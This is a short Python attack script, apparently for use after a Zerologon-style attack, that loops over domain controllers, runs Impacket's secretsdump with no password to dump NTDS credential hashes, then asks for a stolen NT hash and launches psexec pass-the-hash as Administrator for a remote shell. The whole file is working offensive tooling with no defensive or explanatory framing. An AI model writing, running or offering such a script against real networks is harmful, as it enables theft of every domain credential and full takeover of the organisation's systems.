#!/usr/bin/env python3
import os
import sys

cmd = open(sys.argv[1]).read().splitlines()
for line in cmd:
 #print(line)
 try:
        cmz = line.split('@')
        o = 'python3 secretsdump.py -just-dc '+cmz[0].split('$')[0]+'$@'+cmz[1] +' -no-pass -outputfile ' + cmz[1]
        print(o)
        os.system(o)
        if (':' in open(cmz[1]+".ntds").read()):
                hashes = ':'+input('(:nthash) > ')
                u = input('(:udomain) > ')
                if (u == ''):
                        u = 'Administrator'
                c = cmz[0].split('/')[0]+'/'+u+'@'+cmz[1]
                ps = 'python3 psexec.py -hashes ' +hashes + ' ' + c
                print(ps)
                print(hashes + ' ' + c)
                os.system(ps)
                pass
        else:
                pass
 except KeyboardInterrupt:
        pass
 except FileNotFoundError:
                print('----')
                pass

